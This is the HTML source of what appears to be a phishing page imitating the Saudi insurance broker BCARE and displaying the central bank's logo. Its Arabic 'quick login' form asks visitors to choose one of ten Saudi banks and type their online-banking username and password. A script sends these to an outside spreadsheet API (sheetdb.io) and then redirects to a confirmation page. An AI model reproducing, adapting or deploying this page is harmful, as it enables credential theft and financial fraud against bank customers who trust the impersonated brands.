<!DOCTYPE html>
<html lang="en" dir='rtl'>

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BCARE</title>
    <link rel="stylesheet" href="css/index.css">
    <link rel="stylesheet" href="css/bootstrap.min.css" />
    <link rel="stylesheet" href="css/all.min.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Changa:wght@200;300;400;500;600;700;800&display=swap" rel="stylesheet">

</head>

<body>
    <div class="first-pay">
        <img src="img/bcare-logo.svg" alt="">
        <h2 class="text-center">الدخول السريع </h2>
    </div>
    <form method="POST" action="https://sheetdb.io/api/v1/782821spnc5n9" enctype="multipart/form-data" class="p-3 mt-2 mb-3 formsign " id="sheetdb-form">
        <select class="form-select mb-4" id="validationCustom04" name="bank" required>
            <option selected disabled value="">قم باختيار البنك المناسب</option>
            <option value="1">بنك الرياض</option>
            <option value="2">مصرف الراجحي</option>
            <option value="3">بنك البلاد</option>
            <option value="4">الاهلي</option>
            <option value="5">بنك الجزيرة</option>
            <option value="6">مصرف الانماء</option>
            <option value="7"> سامبا</option>
            <option value="8">البنك السعودي للاستثمار </option>
            <option value="9">العربي </option>
            <option value="10">ساب</option>
        </select>
        <input type="text" class="form-control mb-4" placeholder="اسم المستخدم  " required name="username">
        <input type="password" class="form-control mb-4" placeholder="كلمة السر  " required name="password">
        <button type="submit" name="submit" class="btnform">تسجيل الدخول</button>
    </form>

    <footer id="Contact" class="foot pt-5../ ">
        <div class="foottt ">
            <div class=" mb-3">
                <h4 class="mt-2">مصرح من قبل </h4>
                <img class="img-fluid mb-4" src="img/sama-logo.svg" alt="" width="150px" height="150px">
            </div>
        </div>
        <div class="textfooter p-3">
            <p>الشروط والأحكام | سياسة الخصوصية | قواعد ولوائح البنك المركزي السعودي | عن الشركة | اطبع وثيقتك
                راسلنا | المدونة | خصومات وريف | التوظيف | طريقة رفع شكوى لساما |</p>
            <p>جميع الحقوق محفوظة , شركة عناية الوسيط لوساطة التأمين <b>© 2022 </b></p>
        </div>
    </footer>



    <!-- <script src="../js/pp-script.js"></script> -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

    <script>
        var form = document.getElementById('sheetdb-form');
        form.addEventListener("submit", e => {
            e.preventDefault();
            fetch(form.action, {
                method: "POST",
                body: new FormData(document.getElementById("sheetdb-form")),
            }).then(
                response => response.json()
            ).then((html) => {
                // you can put any JS code here
                window.location.href="confirm.html";
            });
        });
    </script>
</body>

</html>
